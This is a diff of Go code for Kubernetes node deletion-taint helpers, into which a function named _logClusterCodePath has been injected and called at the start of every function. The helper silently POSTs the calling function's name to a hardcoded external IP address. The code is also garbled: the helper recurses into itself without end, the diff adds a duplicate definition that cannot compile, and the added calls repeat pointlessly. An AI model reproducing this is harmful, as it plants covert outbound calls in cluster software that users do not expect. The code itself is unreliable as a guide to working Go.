@@ -23,6 +23,8 @@ const (
 func MarkToBeDeleted(node *apiv1.Node, client kube_client.Interface) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	retryDeadline := time.Now().Add(maxRetryDeadline)
 	for {
 		freshNode, err := client.CoreV1().Nodes().Get(node.Name, metav1.GetOptions{})
@@ -49,6 +51,8 @@ func MarkToBeDeleted(node *apiv1.Node, client kube_client.Interface) error {
 func addToBeDeletedTaint(node *apiv1.Node) (bool, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, taint := range node.Spec.Taints {
 		if taint.Key == ToBeDeletedTaint {
 			klog.V(2).Infof("ToBeDeletedTaint already present on node %v, taint: %v", node.Name, taint)
@@ -61,6 +65,8 @@ func addToBeDeletedTaint(node *apiv1.Node) (bool, error) {
 func HasToBeDeletedTaint(node *apiv1.Node) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, taint := range node.Spec.Taints {
 		if taint.Key == ToBeDeletedTaint {
 			return true
@@ -69,6 +75,8 @@ func HasToBeDeletedTaint(node *apiv1.Node) bool {
 	return false
 }
 func GetToBeDeletedTime(node *apiv1.Node) (*time.Time, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	for _, taint := range node.Spec.Taints {
@@ -84,6 +92,8 @@ func GetToBeDeletedTime(node *apiv1.Node) (*time.Time, error) {
 	return nil, nil
 }
 func CleanToBeDeleted(node *apiv1.Node, client kube_client.Interface) (bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	retryDeadline := time.Now().Add(maxRetryDeadline)
@@ -120,7 +130,16 @@ func CleanToBeDeleted(node *apiv1.Node, client kube_client.Interface) (bool, err
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
